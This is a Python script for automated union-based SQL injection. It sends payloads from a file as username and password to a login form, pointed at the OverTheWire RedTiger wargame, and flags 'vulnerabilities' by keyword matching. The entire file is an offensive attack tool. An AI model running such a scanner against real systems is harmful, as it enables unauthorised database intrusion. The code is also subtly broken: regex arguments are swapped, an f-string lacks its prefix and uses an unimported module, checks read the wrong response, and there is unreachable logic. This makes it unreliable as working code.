import os
import asyncio
import re
import requests
from colorama import Fore,init




####################################33
pattern = r"\berror\b"
htmlpattern = r"\bid\b"
########################################






async def union_based_SQL_inj(urls):
    try:
        global pattern,htmlpattern
        done = False
        filename = "UnionselectInj.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            print(Fore.RED + str(sorted_payload))
            requests.packages.urllib3.disable_warnings()  # Disable SSL warnings
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(Fore.GREEN + "Looks like the host is up with the ip address: {socket.gethostbyname(url)} Do you want to send the payload to the website? ")
                
                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"):
                        #############################################################33
                        params = {
                            "username": line,
                            "password": line
                        }
                        ##############################################################################
                        print(line)
                        ack = requests.post(url=urls, data=params,verify=False)
                        print("|Current payload: |", line,"|with status code|:",ack.status_code)
                        print(Fore.GREEN + str(ack.status_code))
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            print(Fore.RED + "|Vulnerability found|:", ack.text)
                            
                        vuln = re.findall(ack.text,pattern,flags=re.IGNORECASE)
                        htmlVULN = re.findall(ack.text,htmlpattern,flags=re.IGNORECASE)
                        if vuln:
                            print(Fore.RED + " | Vulnerability found: |", ack.text," | with the count of: |",len(vuln))
                            await asyncio.sleep(3)
                        
                        if htmlVULN:
                            print(Fore.RED + "|Vulnerability found|:", ack.text,"with the count of:",len(htmlVULN))
                            await asyncio.sleep(3)
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            print(Fore.GREEN + "|Vulnerability found|:", ack.text,"|with the count of:|",len(htmlVULN))
                            await asyncio.sleep(3)
                        
                        if errword:
                            print(Fore.RED + "|Vulnerability found|:", ack.text,"|with the count of:|",len(htmlVULN))
                            await asyncio.sleep(3)
                            
                        
                            
                    if req.status_code == 302:
                        print("[INFO]Could inject the injectable are to the website:",line)
                        done = True
                        
                else:
                    # continue
                    pass
                        
            else:
                print("[ERROR]Could not connect to the website.Host seems to be down or not available at the time")
                        
                    
    
    except ConnectionAbortedError as e:
        print("[ERROR]ConnectionAbortedError:",e)
        
    except ConnectionError as e:
        print("[ERROR]ConnectionError:",e)
        
    except ConnectionRefusedError as e:
        print("[ERROR]ConnectionRefusedError",e)
        
    except ConnectionResetError as e:
        print("[ERROR]ConnectionResetError:",e)
        
    except KeyboardInterrupt:
        ch = input(Fore.RED+"[!] Are you sure that you want to exit?")
        if ch == "y":
            raise SystemExit
        print(Fore.BLACK+"[INFO] User exited the program")
        
    except UnboundLocalError:
        pass
    
    except Exception as e:
        print(f"Error: {str(e)}")
        
    except MemoryError as e:
        print(Fore.RED+"[ERROR]There is an issue with you RAM:",e)
        
    finally:
        print(Fore.BLUE+f"""[INFO] The final result of html response:
                           \n{ack.text}\n     """)
        
                
asyncio.run(union_based_SQL_inj("https://redtiger.labs.overthewire.org/level1.php"))